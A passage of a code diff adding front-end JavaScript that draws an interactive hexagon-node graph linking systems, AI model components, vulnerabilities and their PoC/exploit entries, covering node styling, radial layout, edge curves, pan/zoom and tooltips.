+      'model-4': ['comp-diffusers','comp-safetensors'], 'model-5': ['comp-transformers'], 'model-6': [], 'model-7': [], 'model-8': [], 'model-9': [],
+      'comp-pytorch': ['vuln-1','vuln-2'], 'comp-transformers': ['vuln-3'], 'comp-fastapi': ['vuln-4'],
+      'comp-triton': ['vuln-5'], 'comp-diffusers': ['vuln-6','vuln-8'], 'comp-onnxruntime': ['vuln-7'],
+      'comp-numpy':[], 'comp-safetensors':[],
+      'vuln-1':['poc-1','exp-1'],'vuln-2':['poc-2','exp-2'],'vuln-3':['poc-3','exp-3'],'vuln-4':['poc-4','exp-4'],
+      'vuln-5':['poc-5','exp-5'],'vuln-6':['poc-6','exp-6'],'vuln-7':['poc-7','exp-7'],'vuln-8':['poc-8','exp-8'],
+      'poc-1':[],'exp-1':[],'poc-2':[],'exp-2':[],'poc-3':[],'exp-3':[],'poc-4':[],'exp-4':[],
+      'poc-5':[],'exp-5':[],'poc-6':[],'exp-6':[],'poc-7':[],'exp-7':[],'poc-8':[],'exp-8':[]
+    }
+  };
+
+  /* ===========================================================
+   * [V1.3 BUSINESS] Node Visual Config
+   * 六边形节点 白底彩边，参考图片样式
+   * =========================================================== */
+  // Node configs: light / dark variants
+  const NODE_CONFIG_LIGHT = {
+    system:    { r:42, stroke:'#3B82F6', fill:'#EBF5FF',  iconClass:'ri-server-line',      iconColor:'#3B82F6', iconSize:20, shape:'hexagon' },
+    app:       { r:34, stroke:'#10B981', fill:'#ECFDF5',  iconClass:'ri-apps-line',         iconColor:'#10B981', iconSize:17, shape:'hexagon' },
+    container: { r:34, stroke:'#8B5CF6', fill:'#F3EEFF',  iconClass:'ri-layout-grid-line',  iconColor:'#8B5CF6', iconSize:17, shape:'hexagon' },
+    model:     { r:34, stroke:'#F59E0B', fill:'#FFFBEB',  iconClass:'ri-brain-line',        iconColor:'#F59E0B', iconSize:17, shape:'hexagon' },
+    component: { r:26, stroke:'#06B6D4', fill:'#E0FFFE',  iconClass:'ri-code-box-line',     iconColor:'#06B6D4', iconSize:13, shape:'hexagon' },
+    poc:       { r:22, stroke:'#0EA5E9', fill:'#E0F2FE',  iconClass:'ri-file-code-line',    iconColor:'#0EA5E9', iconSize:12, shape:'hexagon' },
+    exp:       { r:22, stroke:'#EF4444', fill:'#FFF1F2',  iconClass:'ri-rocket-line',       iconColor:'#EF4444', iconSize:12, shape:'hexagon' },
+    vuln: {
+      critical: { r:22, stroke:'#722ED1', fill:'#F3EEFF', iconClass:'ri-bug-line', iconColor:'#722ED1', iconSize:16, shape:'circle' },
+      high:     { r:22, stroke:'#F53F3F', fill:'#FFF0F0', iconClass:'ri-bug-line', iconColor:'#F53F3F', iconSize:16, shape:'circle' },
+      medium:   { r:20, stroke:'#FF7D00', fill:'#FFF7E8', iconClass:'ri-bug-line', iconColor:'#FF7D00', iconSize:14, shape:'circle' },
+      low:      { r:18, stroke:'#00B42A', fill:'#E8FFEF', iconClass:'ri-bug-line', iconColor:'#00B42A', iconSize:13, shape:'circle' }
+    }
+  };
+  const NODE_CONFIG_DARK = {
+    system:    { r:42, stroke:'#5b9bf8', fill:'#162240',  iconClass:'ri-server-line',      iconColor:'#5b9bf8', iconSize:20, shape:'hexagon' },
+    app:       { r:34, stroke:'#34d399', fill:'#0d2e22',  iconClass:'ri-apps-line',         iconColor:'#34d399', iconSize:17, shape:'hexagon' },
+    container: { r:34, stroke:'#a78bfa', fill:'#1e1535',  iconClass:'ri-layout-grid-line',  iconColor:'#a78bfa', iconSize:17, shape:'hexagon' },
+    model:     { r:34, stroke:'#fbbf24', fill:'#2a1e08',  iconClass:'ri-brain-line',        iconColor:'#fbbf24', iconSize:17, shape:'hexagon' },
+    component: { r:26, stroke:'#22d3ee', fill:'#0a2530',  iconClass:'ri-code-box-line',     iconColor:'#22d3ee', iconSize:13, shape:'hexagon' },
+    poc:       { r:22, stroke:'#38bdf8', fill:'#0c1e2e',  iconClass:'ri-file-code-line',    iconColor:'#38bdf8', iconSize:12, shape:'hexagon' },
+    exp:       { r:22, stroke:'#f87171', fill:'#2a1010',  iconClass:'ri-rocket-line',       iconColor:'#f87171', iconSize:12, shape:'hexagon' },
+    vuln: {
+      critical: { r:22, stroke:'#c084fc', fill:'#200e35', iconClass:'ri-bug-line', iconColor:'#c084fc', iconSize:16, shape:'circle' },
+      high:     { r:22, stroke:'#f87171', fill:'#2a1010', iconClass:'ri-bug-line', iconColor:'#f87171', iconSize:16, shape:'circle' },
+      medium:   { r:20, stroke:'#fb923c', fill:'#2a1a08', iconClass:'ri-bug-line', iconColor:'#fb923c', iconSize:14, shape:'circle' },
+      low:      { r:18, stroke:'#4ade80', fill:'#0a2016', iconClass:'ri-bug-line', iconColor:'#4ade80', iconSize:13, shape:'circle' }
+    }
+  };
+  function getNodeConfig() {
+    return document.documentElement.classList.contains('dark') ? NODE_CONFIG_DARK : NODE_CONFIG_LIGHT;
+  }
+  // Proxy so existing code using NODE_CONFIG still works
+  const NODE_CONFIG = new Proxy({}, { get(_, k) { return getNodeConfig()[k]; } });
+
+  /* ===========================================================
+   * [V1.3 BUSINESS] STATE
+   * =========================================================== */
+  let currentRoot = null;
+  let activeNodeId = null;
+  let drillPath   = [];
+  let zoom  = 1, panX = 0, panY = 0;
+  let svgW  = 800, svgH = 600;
+  let isPanning = false, lastPX = 0, lastPY = 0;
+  const VULN_PALETTE = { critical:'#722ED1', high:'#F53F3F', medium:'#FF7D00', low:'#00B42A', none:'#94a3b8' };
+
+  function getNodeGlowColor(node) {
+    if (!node) return VULN_PALETTE.none;
+    if (node.type === 'vuln') {
+      const lvl = node.vulnLevel || node.risk || 'none';
+      return VULN_PALETTE[lvl] || VULN_PALETTE.none;
+    }
+    const r = node.risk || 'none';
+    return VULN_PALETTE[r] || VULN_PALETTE.none;
+  }
+
+  function clearActiveNodeEffects() {
+    document.querySelectorAll('#nodesLayer g').forEach(g => {
+      g.classList.remove('selected-node');
+      g.style.animation = '';
+      g.querySelectorAll('.node-glow').forEach(el => el.remove());
+      g.querySelectorAll('.node-pulse').forEach(el => el.remove());
+      const c = g.querySelector('.node-shape');
+      if (c) c.setAttribute('stroke-width','1.5');
+    });
+  }
+
+  function applyActiveNodeEffects(node) {
+    if (!node) return;
+    const el = document.querySelector(`#nodesLayer g[data-id="${node.id}"]`);
+    if (!el) return;
+    const shape = el.querySelector('.node-shape');
+    if (!shape) return;
+
+    const color = getNodeGlowColor(node);
+    el.classList.add('selected-node');
+    el.style.opacity = '1';
+    shape.setAttribute('stroke-width','2.6');
+
+    const allowPulse = node.type !== 'poc' && node.type !== 'exp';
+    const px = Number(el.getAttribute('data-x'));
+    const py = Number(el.getAttribute('data-y'));
+    if (allowPulse && Number.isFinite(px) && Number.isFinite(py)) {
+      const pulse = document.createElementNS('http://www.w3.org/2000/svg','circle');
+      pulse.setAttribute('cx', px);
+      pulse.setAttribute('cy', py);
+      pulse.setAttribute('r', '32');
+      pulse.setAttribute('fill', 'none');
+      pulse.setAttribute('stroke', color);
+      pulse.setAttribute('stroke-width', '2');
+      pulse.setAttribute('opacity', '0.3');
+      pulse.style.animation = 'pulseRing 2.5s ease-out infinite';
+      pulse.classList.add('node-pulse');
+      el.insertBefore(pulse, el.firstChild);
+    }
+
+    const glowOuter = document.createElementNS('http://www.w3.org/2000/svg','path');
+    glowOuter.setAttribute('d', shape.getAttribute('d'));
+    glowOuter.setAttribute('fill','none');
+    glowOuter.setAttribute('stroke', color);
+    glowOuter.setAttribute('stroke-width','12');
+    glowOuter.setAttribute('opacity','0.18');
+    glowOuter.setAttribute('filter','url(#nodeGlowBlur)');
+    glowOuter.classList.add('node-glow');
+
+    const glowInner = document.createElementNS('http://www.w3.org/2000/svg','path');
+    glowInner.setAttribute('d', shape.getAttribute('d'));
+    glowInner.setAttribute('fill','none');
+    glowInner.setAttribute('stroke', color);
+    glowInner.setAttribute('stroke-width','4');
+    glowInner.setAttribute('opacity','0.50');
+    glowInner.classList.add('node-glow');
+
+    shape.parentNode.insertBefore(glowOuter, shape);
+    shape.parentNode.insertBefore(glowInner, shape);
+
+    el.style.animation = allowPulse ? `floatUp ${3 + Math.random() * 2}s ease-in-out ${Math.random() * 0.4}s infinite` : '';
+  }
+
+  /* ===========================================================
+   * [V1.3 BUSINESS] INIT
+   * =========================================================== */
+  function initGraph() {
+    const wrap = document.querySelector('.graph-canvas-wrap');
+    svgW = wrap.clientWidth  || 800;
+    svgH = wrap.clientHeight || 600;
+    const svg = document.getElementById('topologySvg');
+    svg.setAttribute('viewBox', `0 0 ${svgW} ${svgH}`);
+    document.getElementById('bgGlowCircle').setAttribute('cx', svgW / 2);
+    document.getElementById('bgGlowCircle').setAttribute('cy', svgH / 2);
+    initPanDrag();
+    renderGraph(null);
+  }
+
+  /* ===========================================================
+   * [V1.3 BUSINESS] PAN / DRAG / WHEEL ZOOM
+   * =========================================================== */
+  function initPanDrag() {
+    const svg = document.getElementById('topologySvg');
+    svg.addEventListener('mousedown', function(e) {
+      if (e.target.closest('#nodesLayer')) return;
+      isPanning = true; lastPX = e.clientX; lastPY = e.clientY;
+      svg.style.cursor = 'grabbing';
+    });
+    window.addEventListener('mousemove', function(e) {
+      if (!isPanning) return;
+      panX += (e.clientX - lastPX) / zoom;
+      panY += (e.clientY - lastPY) / zoom;
+      lastPX = e.clientX; lastPY = e.clientY;
+      applyTransform();
+    });
+    window.addEventListener('mouseup', function() {
+      isPanning = false;
+      const s = document.getElementById('topologySvg');
+      if (s) s.style.cursor = 'grab';
+    });
+    svg.addEventListener('wheel', function(e) {
+      e.preventDefault();
+      changeZoom(e.deltaY < 0 ? 1.1 : 0.9);
+    }, { passive: false });
+  }
+
+  /* ===========================================================
+   * [V1.3 BUSINESS] RENDER
+   * =========================================================== */
+  function renderGraph(rootId) {
+    currentRoot = rootId;
+    document.getElementById('nodesLayer').innerHTML = '';
+    document.getElementById('edgesLayer').innerHTML = '';
+    const visIds = getVisibleNodes(rootId);
+    const positions = layoutNodes(rootId, visIds);
+    const edges = getVisibleEdges(rootId, visIds).filter(e => visIds.includes(e.from) && visIds.includes(e.to));
+    const secondary = [], primary = [];
+    edges.forEach(e => (isPrimaryEdge(e, rootId) ? primary : secondary).push(e));
+    secondary.forEach(e => drawEdge(document.getElementById('edgesLayer'), e, positions));
+    primary.forEach(e => drawEdge(document.getElementById('edgesLayer'), e, positions));
+    visIds.forEach(id => {
+      const node = GRAPH_DATA.nodes[id];
+      const pos  = positions[id];
+      if (node && pos) drawNode(document.getElementById('nodesLayer'), node, pos);
+    });
+  }
+
+  function uniqIds(arr) {
+    return Array.from(new Set((arr || []).filter(Boolean)));
+  }
+
+  function getRootIds() {
+    return GRAPH_DATA.children[null] || Object.values(GRAPH_DATA.nodes).filter(n => n.type === 'system').map(n => n.id);
+  }
+
+  function getDrillChildren(nodeId) {
+    if (!nodeId) return getRootIds();
+    const node = GRAPH_DATA.nodes[nodeId];
+    if (!node) return [];
+    const nodes = GRAPH_DATA.nodes;
+    const edges = GRAPH_DATA.edges;
+
+    if (node.type === 'system') {
+      const containers = Object.values(nodes).filter(n => n.type === 'container' && n.system === nodeId).map(n => n.id);
+      const apps = Object.values(nodes).filter(n => n.type === 'app' && n.system === nodeId).map(n => n.id);
+      const models = Object.values(nodes).filter(n => n.type === 'model' && n.system === nodeId).map(n => n.id);
+
+      const directComponents = edges
+        .filter(e => e.from === nodeId && nodes[e.to]?.type === 'component' && (e.rel === 'contain' || e.rel === 'exist'))
+        .map(e => e.to);
+
+      if (nodeId === 'sys-1') {
+        const keep = new Set(['comp-pytorch', 'comp-fastapi']);
+        const keptDirect = directComponents.filter(id => keep.has(id));
+        return uniqIds([...containers, ...apps, ...models, ...keptDirect]);
+      }
+
+      const comps = new Set(directComponents);
+      const scopeFrom = new Set([...containers, ...apps, ...models]);
+      edges.forEach(e => {
+        if (!scopeFrom.has(e.from)) return;
+        if (nodes[e.to]?.type === 'component') comps.add(e.to);
+      });
+
+      if (directComponents.length > 0 && containers.length === 0 && apps.length === 0 && models.length === 0) {
+        return uniqIds(directComponents);
+      }
+
+      return uniqIds([...containers, ...apps, ...models, ...Array.from(comps)]);
+    }
+
+    if (node.type === 'app') {
+      const components = edges
+        .filter(e => e.from === nodeId && nodes[e.to]?.type === 'component' && (e.rel === 'depend' || e.rel === 'contain'))
+        .map(e => e.to);
+      const models = edges
+        .filter(e => e.from === nodeId && nodes[e.to]?.type === 'model' && e.rel === 'contain')
+        .map(e => e.to);
+      return uniqIds([...components, ...models]);
+    }
+
+    if (node.type === 'container') {
+      const apps = edges
+        .filter(e => e.from === nodeId && nodes[e.to]?.type === 'app' && e.rel === 'contain')
+        .map(e => e.to);
+
+      const models = new Set();
+      const components = new Set();
+      edges.forEach(e => {
+        if (apps.includes(e.from) && nodes[e.to]?.type === 'model' && e.rel === 'contain') models.add(e.to);
+      });
+      const modelArr = Array.from(models);
+      edges.forEach(e => {
+        if ((apps.includes(e.from) || modelArr.includes(e.from)) && nodes[e.to]?.type === 'component' && (e.rel === 'depend' || e.rel === 'contain')) {
+          components.add(e.to);
+        }
+      });
+
+      return uniqIds([...apps, ...Array.from(models), ...Array.from(components)]);
+    }
+
+    if (node.type === 'model') {
+      const components = edges
+        .filter(e => e.from === nodeId && nodes[e.to]?.type === 'component' && (e.rel === 'depend' || e.rel === 'contain'))
+        .map(e => e.to);
+      return uniqIds(components);
+    }
+
+    if (node.type === 'component') {
+      const vulns = edges
+        .filter(e => e.from === nodeId && nodes[e.to]?.type === 'vuln' && e.rel === 'exist')
+        .map(e => e.to);
+      const users = edges
+        .filter(e => e.to === nodeId && (nodes[e.from]?.type === 'app' || nodes[e.from]?.type === 'model') && (e.rel === 'depend' || e.rel === 'contain'))
+        .map(e => e.from);
+      const deps = Array.isArray(node.deps) ? node.deps.filter(id => nodes[id]?.type === 'component') : [];
+      return uniqIds([...vulns, ...users, ...deps]);
+    }
+
+    if (node.type === 'vuln') {
+      const kids = edges
+        .filter(e => e.from === nodeId && (nodes[e.to]?.type === 'poc' || nodes[e.to]?.type === 'exp') && e.rel === 'contain')
+        .map(e => e.to)
+        .sort((a, b) => {
+          const ta = nodes[a]?.type === 'poc' ? 0 : 1;
+          const tb = nodes[b]?.type === 'poc' ? 0 : 1;
+          return ta - tb;
+        });
+      return uniqIds(kids);
+    }
+
+    return [];
+  }
+
+  function getVisibleEdges(rootId, visIds) {
+    if (!rootId) return [];
+    const node = GRAPH_DATA.nodes[rootId];
+    if (!node) return [];
+    const nodes = GRAPH_DATA.nodes;
+    const children = visIds.filter(id => id !== rootId);
+
+    if (node.type === 'component') {
+      const edges = [];
+      const childNodes = children.map(id => nodes[id]).filter(Boolean);
+      childNodes.forEach(n => {
+        if (n.type === 'vuln') edges.push({ from: rootId, to: n.id, rel: 'exist' });
+        else if (n.type === 'app' || n.type === 'model') edges.push({ from: n.id, to: rootId, rel: 'use' });
+        else if (n.type === 'component') edges.push({ from: rootId, to: n.id, rel: 'depend' });
+      });
+      return edges;
+    }
+
+    return GRAPH_DATA.edges.filter(e => visIds.includes(e.from) && visIds.includes(e.to));
+  }
+
+  function getVisibleNodes(rootId) {
+    if (!rootId) return getRootIds();
+    return uniqIds([rootId, ...getDrillChildren(rootId)]);
+  }
+
+  let _layoutMeta = null;
+
+  function isPrimaryEdge(edge, rootId) {
+    if (!rootId) return false;
+    if (edge.from === rootId || edge.to === rootId) return true;
+    return false;
+  }
+
+  function layoutNodes(rootId, nodeIds) {
+    const pos = {}, cx = svgW / 2, cy = svgH / 2;
+    if (!rootId) {
+      _layoutMeta = null;
+      const n = nodeIds.length;
+      if (n === 1) { pos[nodeIds[0]] = { x:cx, y:cy }; }
+      else {
+        const r = Math.min(svgW, svgH) * 0.3;
+        nodeIds.forEach((id, i) => {
+          const a = (2 * Math.PI * i / n) - Math.PI / 2;
+          pos[id] = { x: cx + r * Math.cos(a), y: cy + r * Math.sin(a) };
+        });
+      }
+    } else {
+      pos[rootId] = { x: cx, y: cy };
+      const minSide = Math.min(svgW, svgH);
+      const r1 = minSide * 0.28;
+      const r2 = minSide * 0.44;
+      const r3 = minSide * 0.60;
+
+      const ids = nodeIds.filter(id => id !== rootId);
+      const visSet = new Set(nodeIds);
+      const edges = GRAPH_DATA.edges.filter(e => visSet.has(e.from) && visSet.has(e.to));
+      const hierEdges = edges.filter(e => e.rel === 'contain' || e.rel === 'exist');
+
+      const out = {};
+      hierEdges.forEach(e => {
+        if (!out[e.from]) out[e.from] = [];
+        out[e.from].push(e.to);
+      });
+
+      const depth = { [rootId]: 0 };
+      const parent = {};
+      const q = [rootId];
+      while (q.length) {
+        const cur = q.shift();
+        const kids = out[cur] || [];
+        kids.forEach(kid => {
+          if (depth[kid] !== undefined) return;
+          depth[kid] = (depth[cur] ?? 0) + 1;
+          parent[kid] = cur;
+          q.push(kid);
+        });
+      }
+
+      const pickBestKnownParent = (id) => {
+        let best = null;
+        edges.forEach(e => {
+          if (e.to === id && depth[e.from] !== undefined) {
+            const cand = { p: e.from, d: depth[e.from] };
+            if (!best || cand.d < best.d) best = cand;
+          }
+          if (e.from === id && depth[e.to] !== undefined) {
+            const cand = { p: e.to, d: depth[e.to] };
+            if (!best || cand.d < best.d) best = cand;
+          }
+        });
+        return best?.p || null;
+      };
+
+      ids.forEach(id => {
+        if (depth[id] !== undefined) return;
+        const p = pickBestKnownParent(id) || rootId;
+        parent[id] = p;
+        depth[id] = (depth[p] ?? 0) + 1;
+      });
+
+      const typeWeight = (t) => {
+        const w = { container: 0, app: 1, model: 2, component: 3, vuln: 4, poc: 5, exp: 6, system: 7 };
+        return w[t] ?? 99;
+      };
+      const sortNodeIds = (a, b) => {
+        const na = GRAPH_DATA.nodes[a], nb = GRAPH_DATA.nodes[b];
+        const wa = typeWeight(na?.type), wb = typeWeight(nb?.type);
+        if (wa !== wb) return wa - wb;
+        return String(na?.label || a).localeCompare(String(nb?.label || b), 'zh');
+      };
+
+      const childrenByParent = {};
+      Object.keys(parent).forEach(cid => {
+        const p = parent[cid];
+        if (!childrenByParent[p]) childrenByParent[p] = [];
+        childrenByParent[p].push(cid);
+      });
+      Object.keys(childrenByParent).forEach(pid => childrenByParent[pid].sort(sortNodeIds));
+
+      const angle = {};
+      const depth1 = (childrenByParent[rootId] || []).slice().sort(sortNodeIds);
+      const n1 = depth1.length;
+      const base = -Math.PI / 2;
+      depth1.forEach((id, i) => {
+        const a = base + 2 * Math.PI * (i / Math.max(1, n1));
+        angle[id] = a;
+        pos[id] = { x: cx + r1 * Math.cos(a), y: cy + r1 * Math.sin(a) };
+      });
+
+      const ringRadius = (d) => {
+        if (d <= 1) return r1;
+        if (d === 2) return r2;
+        if (d === 3) return r3;
+        return Math.min(minSide * 0.84, r3 + (d - 3) * minSide * 0.12);
+      };
+
+      const placeChildren = (pId) => {
+        const kids = childrenByParent[pId] || [];
+        if (!kids.length) return;
+        const pDepth = depth[pId] ?? 0;
+        const kDepth = pDepth + 1;
+        const r = ringRadius(kDepth);
+        const centerA = angle[pId] ?? base;
+        const step = Math.min(Math.PI / 10, (2 * Math.PI) / Math.max(18, n1 * 3));
+        const start = centerA - step * (kids.length - 1) / 2;
+        kids.forEach((kid, idx) => {
+          if (kid === rootId) return;
+          const a = start + step * idx;
+          angle[kid] = a;
+          pos[kid] = { x: cx + r * Math.cos(a), y: cy + r * Math.sin(a) };
+        });
+        kids.forEach(kid => placeChildren(kid));
+      };
+
+      depth1.forEach(id => placeChildren(id));
+
+      ids.forEach(id => {
+        if (pos[id]) return;
+        const a = angle[id] ?? base;
+        const r = ringRadius(depth[id] ?? 2);
+        pos[id] = { x: cx + r * Math.cos(a), y: cy + r * Math.sin(a) };
+      });
+
+      _layoutMeta = { rootId, depth, parent, angle, center: { cx, cy } };
+    }
+    return pos;
+  }
+
+  /* ===========================================================
+   * [V1.3 BUSINESS] DRAW EDGE — 贝塞尔曲线 + 箭头
+   * 包含/存在: 实线 #94a3b8 (灰)   依赖/使用: 虚线 #8B5CF6 (紫)
+   * =========================================================== */
+  function drawEdge(layer, edge, positions) {
+    const from = positions[edge.from], to = positions[edge.to];
+    // Only draw when BOTH endpoints exist in current view
+    if (!from || !to) return;
+    const mx=(from.x+to.x)/2, my=(from.y+to.y)/2;
+    const dx=to.x-from.x, dy=to.y-from.y, dist=Math.sqrt(dx*dx+dy*dy)||1;
+    const nx=-dy/dist, ny=dx/dist;
+
+    const rootId = _layoutMeta?.rootId;
+    const isPrimary = !!rootId && (edge.from === rootId || edge.to === rootId);
+    const cx = _layoutMeta?.center?.cx ?? (svgW / 2);
+    const cy = _layoutMeta?.center?.cy ?? (svgH / 2);
+
+    const fromRoot = Math.min(Math.hypot(from.x - cx, from.y - cy), Math.hypot(to.x - cx, to.y - cy));
+    const midToCenter = Math.hypot(mx - cx, my - cy) || 1;
+    const ox = (mx - cx) / midToCenter;
+    const oy = (my - cy) / midToCenter;
+    const outward = isPrimary ? Math.min(14, Math.max(6, fromRoot * 0.04)) : Math.min(52, Math.max(26, fromRoot * 0.10));
+    const curvature = isPrimary ? 14 : 24;
+    const cx1 = mx + ox * outward + nx * curvature;
+    const cy1 = my + oy * outward + ny * curvature;
+    const path = document.createElementNS('http://www.w3.org/2000/svg','path');
+    path.setAttribute('d', `M ${from.x} ${from.y} Q ${cx1} ${cy1} ${to.x} ${to.y}`);
+    const isDepend = edge.rel==='depend' || edge.rel==='use';
+    // contain/exist: solid grey; depend: dashed purple
+    path.setAttribute('stroke', isDepend ? '#8B5CF6' : '#94a3b8');
+    path.setAttribute('stroke-width', '1');
+    path.setAttribute('fill', 'none');
+    path.setAttribute('opacity', '0.7');
+    if (isDepend) {
+      path.setAttribute('stroke-dasharray', '5,4');
+      path.setAttribute('marker-end', 'url(#arrowDepend)');
+      path.classList.add('edge-flow');
+    } else {
+      path.setAttribute('marker-end', 'url(#arrowContain)');
+    }
+    path.classList.add('edge-enter');
+    path.style.animationDelay = '0.1s';
+    layer.appendChild(path);
+  }
+
+  /* ===========================================================
+   * [V1.3 BUSINESS] DRAW NODE — 六边形/圆，使用 foreignObject 嵌入真实图标
+   * =========================================================== */
+  function drawNode(layer, node, pos) {
+    const g = document.createElementNS('http://www.w3.org/2000/svg','g');
+    g.setAttribute('data-id', node.id);
+    g.setAttribute('data-type', node.type);
+    g.setAttribute('data-risk', node.risk || 'none');
+    g.setAttribute('data-x', String(pos.x));
+    g.setAttribute('data-y', String(pos.y));
+    g.style.cursor = 'pointer';
+    g.classList.add('node-enter');
+    const isCenter = !!currentRoot && node.id === currentRoot;
+    if (currentRoot && !isCenter) g.style.opacity = '0.6';
+
+    let cfg, r;
+    if (node.type==='vuln') { cfg=NODE_CONFIG.vuln[node.vulnLevel]||NODE_CONFIG.vuln.medium; r=cfg.r; }
+    else { cfg=NODE_CONFIG[node.type]; r=cfg?cfg.r:22; }
+
+    // Pulse ring for critical/high system nodes
+    if (node.type==='system' && (node.risk==='critical'||node.risk==='high')) {
+      const rc = node.risk==='critical' ? '#722ED1' : '#F53F3F';
+      const pulse = document.createElementNS('http://www.w3.org/2000/svg','circle');
+      pulse.setAttribute('cx',pos.x); pulse.setAttribute('cy',pos.y); pulse.setAttribute('r',r+10);
+      pulse.setAttribute('fill','none'); pulse.setAttribute('stroke',rc);
+      pulse.setAttribute('stroke-width','2'); pulse.setAttribute('opacity','0.3');
+      pulse.style.animation = 'pulseRing 2.5s ease-out infinite';
+      g.appendChild(pulse);
+    }
+
+    // Build shape path (hexagon for assets, circle for vulns)
+    let sp='';
+    if (cfg.shape==='hexagon') {
+      for (let i=0;i<6;i++) { const a=(i*60-90)*Math.PI/180; sp+=(i===0?'M':'L')+(pos.x+r*Math.cos(a)).toFixed(2)+' '+(pos.y+r*Math.sin(a)).toFixed(2)+' '; }
+      sp+='Z';
+    } else {
+      sp=`M ${pos.x-r},${pos.y} a ${r},${r} 0 1,0 ${r*2},0 a ${r},${r} 0 1,0 -${r*2},0`;
+    }
+
+    // Shadow
+    const shadow = document.createElementNS('http://www.w3.org/2000/svg','path');
+    shadow.setAttribute('d',sp); shadow.setAttribute('fill','rgba(0,0,0,0.07)'); shadow.setAttribute('filter','url(#nodeShadow)');
+    g.appendChild(shadow);
+
+    // Main shape
+    const main = document.createElementNS('http://www.w3.org/2000/svg','path');
+    main.setAttribute('d',sp); main.setAttribute('fill',cfg.fill); main.setAttribute('stroke',cfg.stroke);
+    main.setAttribute('stroke-width', isCenter ? '2.6' : '1.5'); main.classList.add('node-shape');
+    g.appendChild(main);
+
+    // Icon via foreignObject (renders real remixicon <i> tag)
+    const iconSize = cfg.iconSize || 16;
+    const fo = document.createElementNS('http://www.w3.org/2000/svg','foreignObject');
+    fo.setAttribute('x', pos.x - iconSize/2 - 1);
+    fo.setAttribute('y', pos.y - iconSize/2 - 1);
+    fo.setAttribute('width', iconSize + 2);
+    fo.setAttribute('height', iconSize + 2);
+    fo.style.pointerEvents = 'none';
+    const iEl = document.createElement('i');
+    iEl.className = cfg.iconClass || 'ri-question-line';
+    iEl.style.cssText = `font-size:${iconSize}px;color:${cfg.iconColor};display:block;text-align:center;line-height:${iconSize+2}px;pointer-events:none;`;
+    fo.appendChild(iEl);
+    g.appendChild(fo);
+
+    // Risk badge dot on top-right rim
+    if (node.risk && node.risk!=='none' && node.type!=='vuln') {
+      // Match common.css badge colors: critical=purple, high=danger, medium=warning, low=success
+      const riskColors={critical:'#722ED1', high:'#F53F3F', medium:'#FF7D00', low:'#00B42A'};
+      const rc=riskColors[node.risk];
+      if (rc) {
+        const ba=-30*Math.PI/180, bx=pos.x+r*Math.cos(ba), by=pos.y+r*Math.sin(ba);
+        if (node.risk==='critical') {
+          const glow=document.createElementNS('http://www.w3.org/2000/svg','circle');
+          glow.setAttribute('cx',bx);glow.setAttribute('cy',by);glow.setAttribute('r','9');
+          glow.setAttribute('fill',rc);glow.setAttribute('opacity','0.3');glow.style.filter='blur(2px)';
+          g.appendChild(glow);
+        }
+        const bdg=document.createElementNS('http://www.w3.org/2000/svg','circle');
+        bdg.setAttribute('cx',bx);bdg.setAttribute('cy',by);bdg.setAttribute('r','5');
+        bdg.setAttribute('fill',rc);bdg.setAttribute('stroke','#fff');bdg.setAttribute('stroke-width','1.5');
+        g.appendChild(bdg);
+      }
+    }
+
+    // Label
+    const lbl=document.createElementNS('http://www.w3.org/2000/svg','text');
+    lbl.setAttribute('x',pos.x); lbl.setAttribute('y',pos.y+r+16);
+    lbl.setAttribute('text-anchor','middle'); lbl.setAttribute('font-size','11');
+    lbl.setAttribute('fill','#1e293b'); lbl.setAttribute('font-weight','600'); lbl.setAttribute('font-family','Inter,sans-serif');
+    lbl.textContent = node.label.length>14 ? node.label.substring(0,13)+'…' : node.label;
+    g.appendChild(lbl);
+
+    // Sublabel (IP / version)
+    if (node.sublabel) {
+      const sub=document.createElementNS('http://www.w3.org/2000/svg','text');
+      sub.setAttribute('x',pos.x); sub.setAttribute('y',pos.y+r+28);
+      sub.setAttribute('text-anchor','middle'); sub.setAttribute('font-size','9');
+      sub.setAttribute('fill','#64748b'); sub.setAttribute('font-family','Inter,sans-serif');
+      sub.textContent=node.sublabel;
+      g.appendChild(sub);
+    }
+
+    g.addEventListener('mouseenter', e => onNodeHover(e, node, pos, r));
+    g.addEventListener('mouseleave', onNodeLeave);
+    g.addEventListener('click', e => { e.stopPropagation(); onNodeClick(node); });
+    layer.appendChild(g);
+  }
+
+  /* ===========================================================
+   * [V1.3 BUSINESS] EVENTS
+   * =========================================================== */
+  function onNodeHover(e, node, pos, r) {
+    const shape = e.currentTarget.querySelector('.node-shape');
+    if (shape) { shape.setAttribute('stroke-width','3'); shape.style.filter='brightness(1.1)'; }
+    if (node.type==='system') {
+      const tt=document.getElementById('nodeTooltip');
+      document.getElementById('ttTitle').textContent=node.label;
+      document.getElementById('ttType').textContent='系统';
+      document.getElementById('ttRisk').innerHTML=`<span style="color:${riskColor(node.risk)}">${node.riskLabel}</span>`;
+      document.getElementById('ttHost').textContent=node.hostname||'-';
+      const pe = getPrimaryIpEntry(node);
+      document.getElementById('ttIp').textContent=pe?.ip||node.ip||'-';
+      document.getElementById('ttHostRow').style.display=node.hostname?'':'none';
+      document.getElementById('ttIpRow').style.display=(pe?.ip||node.ip)?'':'none';
+      tt.classList.add('show');
+      positionTooltip(tt, pos, r);
+    }
+  }
+
+  function positionTooltip(tt, pos, r) {
+    const wrap=document.querySelector('.graph-canvas-wrap');
+    const wrapRect=wrap.getBoundingClientRect();
+    const svgEl=document.getElementById('topologySvg');
+    const nl=document.getElementById('nodesLayer');
+    let sx,sy,sr;
+    if (svgEl&&svgEl.createSVGPoint&&nl&&nl.getScreenCTM) {
+      const ctm=nl.getScreenCTM();
+      if (ctm) {
+        const pt=svgEl.createSVGPoint(); pt.x=pos.x; pt.y=pos.y; const p0=pt.matrixTransform(ctm);
+        pt.x=pos.x+r; const pR=pt.matrixTransform(ctm);
+        sx=p0.x-wrapRect.left; sy=p0.y-wrapRect.top; sr=Math.max(6,Math.abs(pR.x-p0.x));
+      }
+    }
+    if (sx===undefined) {
+      const sr2=svgEl.getBoundingClientRect();
+      const sc=sr2.width/svgW, sc2=sr2.height/svgH;
+      const txo=svgW/2*(1-zoom)+panX*zoom, tyo=svgH/2*(1-zoom)+panY*zoom;
+      sx=(sr2.left-wrapRect.left)+(pos.x*zoom+txo)*sc;
+      sy=(sr2.top-wrapRect.top)+(pos.y*zoom+tyo)*sc2;
+      sr=Math.max(6,r*zoom*sc);
+    }
+    const ttW=tt.offsetWidth||224, ttH=tt.offsetHeight||100;
+    let x=sx+sr+10, y=sy-ttH/2;
+    if (x+ttW>wrapRect.width-8) x=sx-sr-ttW-10;
+    if (y<8) y=8;
